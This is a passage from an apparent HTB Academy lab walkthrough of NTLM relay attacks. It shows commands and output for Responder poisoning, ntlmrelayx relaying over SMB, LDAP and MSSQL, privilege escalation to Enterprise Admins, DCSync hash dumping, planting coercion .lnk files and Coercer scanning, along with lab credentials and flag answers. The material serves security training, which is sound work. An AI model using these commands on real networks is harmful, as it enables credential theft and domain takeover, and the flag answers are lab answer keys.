[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening at port 1080
[*] IMAPS Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> 
```

Students will notice that a few connections have been successfully relayed, and using the `socks` command within `ntlmrelayx` will allow them to see the relayed authentications based on users, and to which machine the authentication is being relayed.

Code: shell

```shell
socks
```

```
ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.50  INLANEFREIGHT/CJAQ    FALSE        445  
SMB       172.16.117.50  INLANEFREIGHT/NPORTS  FALSE        445  
SMB       172.16.117.50  INLANEFREIGHT/RMONTY  FALSE        445  
SMB       172.16.117.50  INLANEFREIGHT/JPEREZ  FALSE        445  
SMB       172.16.117.50  INLANEFREIGHT/PETER   TRUE         445  
SMB       172.16.117.60  INLANEFREIGHT/JPEREZ  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/RMONTY  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/DPEREZ  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/PETER   FALSE        445
```

Once students have confirmed that `RMONTY`'s authentication has been relayed successfully, they will use `proxychains` and `smbclient.py`. They are able to gain SMB access on the `172.16.117.50` host, using the `-no-pass` option in `smbclient.py` using the relayed authentication will be used to access the resources on the mentioned target.

Code: shell

```shell
proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass
```

```
htb-student@ubuntu:~$ proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
#
```

Right after they have successfully established an SMB session using the relayed authentication, students will have to use the built-in command(s) such as `shares` to list the available shares, `use` to change the working directory to the specified share, `ls` to display the contents in the share, and `get` to download a file from the share. Students will come to know that there is a share called `Finance`, that can be accessed holding a few files, one of which is `connections.txt` that they will have to download.

Code: shell

```shell
shares
use Finance
ls
get connections.txt
```

```
htb-student@ubuntu:~$ proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
Finance
IPC$

# use Finance
# ls
drw-rw-rw-          0  Tue Aug 15 17:49:34 2023 .
drw-rw-rw-          0  Tue Aug 15 17:49:34 2023 ..
-rw-rw-rw-         32  Tue Aug 15 17:50:28 2023 connections.txt
-rw-rw-rw-         65  Sat Aug  5 00:33:32 2023 flag.txt
-rw-rw-rw-         22  Sat Aug  5 00:32:37 2023 report.txt

# get connections.txt
```

Subsequently, once students have downloaded the `connections.txt` using the `get` command, they will have to terminate the SMB connection by issuing the `exit` command. Once they have exited the session, students are going to read the contents of the `connections.txt` and obtain the flag.

Code: shell

```shell
exit
cat connections.txt
```

```
# exit
htb-student@ubuntu:~$ cat connections.txt 

You_C4n_Rel4Y_NoN_Admin_Account$
```

Answer: `You_C4n_Rel4Y_NoN_Admin_Account$`

# NTLMRelayx Use Cases

## Question 2

### "Use impacket's SOCKS server to hold PETER's relayed connections and abuse them to gain remote command execution as Administrator on one of the relayed targets; submit the contents of the file 'C:\\Users\\Peter\\flag.txt'."

Using the previously established SSH session and SOCKS proxying through `ntlmrelayx`, students will proceed to use `PETER`'s relayed authentication. They will use `proxychains` and `smbexec.py` to spawn a semi-interactive shell by creating services that execute commands sent by them on the `172.16.117.50` host, using the `-no-pass` option in `smbexec.py`. The relayed authentication will be used to access the resources on the mentioned target.

Code: shell

```shell
proxychains -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass
type flag.txt
```

```
htb-student@ubuntu:~$ proxychains -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>type C:\Users\Peter\flag.txt

S0c4T_AnD_ProxyChains_R0cks
```

Answer: `S0c4T_AnD_ProxyChains_R0cks`

# NTLM Cross-protocol Relay Attacks

## Question 1

### "Use Responder to capture SMTP credentials. What is the cleartext password for the username 'smtptest'?"

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to start `Responder.py` using `sudo` located in the `tools/Responder` directory in "poisoning" mode by only specifying the `-I` followed by the `ens192` interface, while configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
cd tools/Responder
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

After a while, students will stumble across the authentication using cleartext credentials for SMTP.

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...

[SMTP] Cleartext Client   : fe80::354e:5281:5f46:fbbf
[SMTP] Cleartext Username : 'smtptest
[SMTP] Cleartext Password : SMTP_PlainText_Creds'
```

Additionally, if students miss the poisoned request, they can review the Responder's generated log file in the tool's `logs/` directory:

Code: shell

```shell
ls logs/
cat logs/SMTP-Cleartext-ClearText-fe80\:\:354e\:5281\:5f46\:fbbf.txt 
```

```
htb-student@ubuntu:~/tools/Responder$ ls logs/

Analyzer-Session.log
Config-Responder.log
HTTP-NTLMv2-fe80::354e:5281:5f46:fbbf.txt
MSSQL-NTLMv2-172.16.117.3.txt
Poisoners-Session.log
Responder-Session.log
SMB-NTLMv2-SSP-172.16.117.50.txt
SMB-NTLMv2-SSP-fe80::452:13a7:ee9c:b359.txt
SMTP-Cleartext-ClearText-fe80::354e:5281:5f46:fbbf.txt

htb-student@ubuntu:~/tools/Responder$ cat logs/SMTP-Cleartext-ClearText-fe80\:\:354e\:5281\:5f46\:fbbf.txt

b"'smtptest":b"SMTP_PlainText_Creds'"
```

Answer: `SMTP_PlainText_Creds`

# NTLM Cross-protocol Relay Attacks

## Question 2

### "Relay HTTP NTLM authentication over LDAP(S) to dump the LDAP information on the DC (172.16.117.3); submit the account name starting with 'prototype'."

Using the previously spawned target, students will have to note that they will need to either establish two SSH connections to the spawned target machine, use `tmux`, or connect to the target via `RDP`. This is because they will utilize `Responder` , and `ntlmrelayx`, and since those tools take over the stdin while they are running.

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to change their working directory to `tools/Responder`. They will have to turn off the SMB Server and HTTP Server, usually started by `Responder` by altering the configuration in the `Responder.conf` file located in the same directory. This is done to allow the relayed authentication to go to `ntlmrelayx`.

Code: shell

```shell
cd tools/Responder
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
cat Responder.conf | grep -ie "SMB =\|HTTP ="
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf

htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -ie "SMB =\|HTTP ="
SMB = Off
HTTP = Off
```

Students need to start `Responder.py` using `sudo` located in the `tools/Responder` directory in "poisoning" mode by only specifying the `-I` parameter followed by the `ens192` interface and configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Subsequently, within the second established SSH session will have to start `ntlmrelayx` using `sudo` specifying the `-t` option for the target with the protocol, `-smb2support` option providing `SMBv2` support for hosts that are requiring it, `--no-da` to not attempt to add a Domain Admin, `--no-acl` to disable ACL related attacks:

Code: shell

```shell
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl
[sudo] password for htb-student: HTB_@cademy_stdnt!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Once they have started `ntlmrelayx`, students will notice that one of the relayed authentications was able to do an enumeration on the domain and dump the information in the working directory where `ntlmrelayx` was started.

```
<SNIP>
[*] HTTPD(80): Authenticating against [ldap://172.16.117.3](ldap://172.16.117.3) as INLANEFREIGHT/CJAQ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] SMBD-Thread-12: Connection from 172.16.117.50 controlled, but there are no more targets left!
[*] SMBD-Thread-13: Connection from 172.16.117.50 controlled, but there are no more targets left!
[*] Domain info dumped into lootdir!
```

Right after the domain info has been dumped, students will have to terminate `ntlmrelayx` by using the key combination `Ctrl + C`. By listing their current working directory, students will notice that a few files were generated that hold information about the domain such as computers, groups, policies, and users, in various file formats such as `json`, `grep`, and `html`.

Code: shell

```shell
ls
```

```
htb-student@ubuntu:~$ ls

Desktop    Videos                       domain_groups.json  domain_users.grep
Documents  domain_computers.grep        domain_policy.grep  domain_users.html
Downloads  domain_computers.html        domain_policy.html  domain_users.json
Music      domain_computers.json        domain_policy.json  domain_users_by_group.html
Pictures   domain_computers_by_os.html  domain_trusts.grep  go
Public     domain_groups.grep           domain_trusts.html  thinclient_drives
Templates  domain_groups.html           domain_trusts.json  tools
```

Students will have to use `grep` with the `-i` option to ignore case distinctions in patterns and data, `cut` with the `-d` option to specify the delimiter and the `-f` to specify the field, and `awk` to print only the first column of the search. Right after the students have run the command(s), they will get the username that contains `prototype` in itself.

Code: shell

```shell
grep -i 'prototype' domain_users.grep | cut -d ' ' -f1 | awk '{print $1}'
```

```
htb-student@ubuntu:~$ grep -i 'prototype' domain_users.grep | cut -d ' ' -f1 | awk '{print $1}'

prototypeproject
```

Answer: `prototypeproject`

# NTLM Cross-protocol Relay Attacks

## Question 3

### "Relay HTTP authentication over LDAP(S) to create a new computer on the DC (172.16.117.3). Then, escalate the privileges of the newly added computer account by relaying the highly-privileged NPORTS NTLM authentication over LDAP(S). Perform a DCSync attack and submit the NT hash of the account 'rons'."

Using the previously established SSH sessions, students will proceed to start `Responder.py` using `sudo` in poisoning mode using the previously altered configuration:

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Subsequently, students need to start `ntlmrelayx` using `sudo` in another terminal window, targeting the `ldap` protocol and the domain controller (`172.16.117.3`), specifying the options: `-smb2support` to support SMB2 if required, `--no-da` to not attempt to add a Domain Admin, `--no-acl` to disable ACL attacks and `--add-computer` to attempt to add a new computer account in the domain:

Code: shell

```shell
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'Academy-Student'
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'Academy-Student'
[sudo] password for htb-student: HTB_@cademy_stdnt!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

After a few moments, they will notice a privileged enough authentication has been relayed and a computer account has been successfully created.

```
<SNIP>
[*] HTTPD(80): Authenticating against [ldap://172.16.117.3](ldap://172.16.117.3) as INLANEFREIGHT/CJAQ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
<SNIP>
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: Academy-Student$ and password: tnQiJcs1OcN9oLE result: OK
<SNIP>
```

Once the students have successfully added a new computer account in the domain, they will have to utilize `ntlmrelayx` to escalate the privileges of the added computer account, allowing the computer account administrative rights/permissions (replication rights) to make a `DCSync` attack. Students will have to target the `ldap` protocol and the domain controller (`172.16.117.3`) with the options: `-smb2support` to support SMB2 if required, `--escalate-user` to escalate the privileges of the user, and the `--no-dump` to disable the dumping of the `LDAP` information.

Code: shell

```shell
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'Academy-Student$' --no-dump
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'Academy-Student$' --no-dump
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /xml;
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target [ldap://172.16.117.3](ldap://172.16.117.3)
[*] HTTPD(80): Client requested path: /xml;
[*] HTTPD(80): Authenticating against [ldap://172.16.117.3](ldap://172.16.117.3) as INLANEFREIGHT/NPORTS SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] Adding user: Academy-Student to group Enterprise Admins result: OK
[*] Privilege escalation succesful, shutting down...
```

Right after the students have successfully escalated the privileges of the computer account, they will have to utilize `secretsdump.py` part of Impacket to perfom a `DCSync` attack and dump the hashes of the domain users, including the user `rons`.

Code: shell

```shell
secretsdump.py inlanefreight/Academy-Student\$@172.16.117.3
```

```
htb-student@ubuntu:~$ secretsdump.py inlanefreight/Academy-Student\$@172.16.117.3
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2e351871c9f5d9e135e269da71692135
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a678b5e7cc4c143b1d76a69ddf14c3ae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
INLANEFREIGHT.LOCAL\rons:1161:aad3b435b51404eeaad3b435b51404ee:914b011029e6b43cf188d435951831bd:::
<SNIP>
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up.
```

Answer: `914b011029e6b43cf188d435951831bd`

# NTLM Cross-protocol Relay Attacks

## Question 4

### "Use impacket's SOCKS server to hold NPORT's relayed connections and abuse them to access the MSSQL service at 172.16.117.60; query the 'flag' table within the 'development01' database and submit the flag."

Using the previously established SSH sessions, students will proceed to start `Responder.py` using `sudo` in poisoning mode using the previously altered configuration:

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Right after, students will have to create a target list containing the target (`172.16.117.60`) and the protocol `MSSQL` from the other SSH session.

Code: shell

```shell
echo "mssql://172.16.117.60" > target.txt
cat target.txt 
```

```
htb-student@ubuntu:~$ echo "mssql://172.16.117.60" > target.txt
htb-student@ubuntu:~$ cat target.txt

mssql://172.16.117.60
```

Once, they have created the target file, students will have to switch to the root user using `sudo su`.

Code: shell

```shell
sudo su
```

```
htb-student@ubuntu:~$ sudo su
root@ubuntu:/home/htb-student#
```

Subsequently, students need to start `ntlmrelayx` with the `-tf` (Target File) option specifying the `target.txt` file, the `-smb2support` providing `SMBv2` support for hosts that require it, and the `-socks` option in order to start a SOCKS proxy, while simultaneously relaying the authentications.

Code: shell

```shell
ntlmrelayx.py -tf target.txt -smb2support -socks
```

```
root@ubuntu:/home/htb-student# ntlmrelayx.py -tf target.txt -smb2support -socks
Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
Type help for list of commands
ntlmrelayx>
```

After a while, they will notice that a few authentication requests are being relayed, one of which is `NPORT`'s.

Code: shell

```shell
socks
```

```
ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
<SNIP>
MSSQL     172.16.117.60  INLANEFREIGHT/NPORTS  N/A          1433 
ntlmrelayx>
```

Students will have to start a third SSH session with the spawned target. Once they have successfully connected, they will utilize `proxychains4` and `mssqlclient.py` with the options `-no-pass` to not specify a password when authenticating, and `-windows-auth` to use Windows authentication.

Code: shell

```shell
proxychains4 mssqlclient.py INLANEFREIGHT/NPORTS@172.16.117.60 -no-pass -windows-auth
```

```
htb-student@ubuntu:~$ proxychains4 mssqlclient.py INLANEFREIGHT/NPORTS@172.16.117.60 -no-pass -windows-auth

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.11.0 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.117.60:1433  ...  OK
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (INLANEFREIGHT\nports  dbo@master)>
```

Subsequently, they will have to use a SQL query to get the flag from the `flag` table located in the `development01` database, where students will find the flag.

Code: sql

```sql
use development01;
select * from flag;
```

```
<SNIP>
SQL (INLANEFREIGHT\nports  dbo@master)> use development01;

[*] ENVCHANGE(DATABASE): Old Value: master, New Value: development01
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'development01'.

SQL (INLANEFREIGHT\nports  dbo@development01)> select * from flag;

flagcontent                       
-------------------------------   
b'Relaying_2_D4t@Bases_1S_Cool'
```

Answer: `Relaying_2_D4t@Bases_1S_Cool`

# Farming Hashes

## Question 1

### "Enumerate the network to locate an anonymously accessible shared folder with READ and WRITE access named 'smb'. Place a file in it to force users to connect to your attack machine. Then, using Responder in Analyze mode, submit the NTLMv2-SSP Username (without the domain) of the authentication request to the poisoned response sent to 172.16.117.50."

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Right after connecting to the target machine, students will use `CrackMapExec` to find an SMB share accessible by an anonymous user on `172.16.117.3` using its `--shares` option. This will enumerate the accessible shares in the specified subnet and the respective access to these shares. Subsequently, students will see that they have `READ` and `WRITE` permissions on the `smb` share.

Code: shell

```shell
crackmapexec smb 172.16.117.0/24 -u anonymous -p '' --shares
```

```
htb-student@ubuntu:~: crackmapexec smb 172.16.117.0/24 -u anonymous -p '' --shares

<SNIP>                     
SMB         172.16.117.3    445    DC01             smb             READ,WRITE      
SMB         172.16.117.3    445    DC01             SYSVOL                          Logon server share 
SMB         172.16.117.3    445    DC01             Testing         READ,WRITE      
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

They will use `CrackMapExec` and its `slinky` module that creates malicious `.lnk` files and automatically places them in accessible shares and the malicious file will be used to coerce an authentication to a host the students have specified. The `slinky` module requires two options `SERVER`, requiring the IP address of the machine to which the coerce authentication will happen, and `NAME`, requiring the name of the file that will be generated.

Code: shell

```shell
crackmapexec smb 172.16.117.3 -u anonymous -p ''  -M slinky -o SERVER=172.16.117.30 NAME=importantt
```

```
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.3 -u anonymous -p ''  -M slinky -o SERVER=172.16.117.30 NAME=importantt

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous: 
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: smb
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the smb share
<SNIP>
```

Right after they have used the module (`slinky`), students will proceed to use `Responder` in analyze mode:

Code: shell

```shell
cd tools/Responder
sudo python3 Responder.py -I ens192 -A
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192 -A
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>
```

After a while, students will notice the following authentication request in `Responder` containing the username:

```
<SNIP>
[Analyze mode: MDNS] Request by 172.16.117.3 for WS1.local, ignoring
[Analyze mode: MDNS] Request by 172.16.117.3 for WS1.local, ignoring
[Analyze mode: NBT-NS] Request by 172.16.117.60 for TEXT, ignoring

[SMB] NTLMv2-SSP Client   : 172.16.117.50
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\cmatos
<SNIP>
```

Answer: `CMATOS`

# Authentication Coercion

## Question 1

### "Use Coerce in 'scan' mode against 172.16.117.60 and submit the name of the second accessible SMB named pipe."

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Once they have successfully connected to the target machine via SSH, they will have to utilize the tool `Coercer`. It has different modes that can be used to either scan available name pipes or coerce authentication(s). Students will have to use the `scan` mode followed by a username (`-u`) and password (`-p`), they can specify dummy credentials for the purpose.

Code: shell

```shell
Coercer scan -t 172.16.117.60 -u 'dummyUser' -p 'dummyPassword'
```

```
htb-student@ubuntu:~$ Coercer scan -t 172.16.117.60 -u 'dummyUser' -p 'dummyPassword'
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
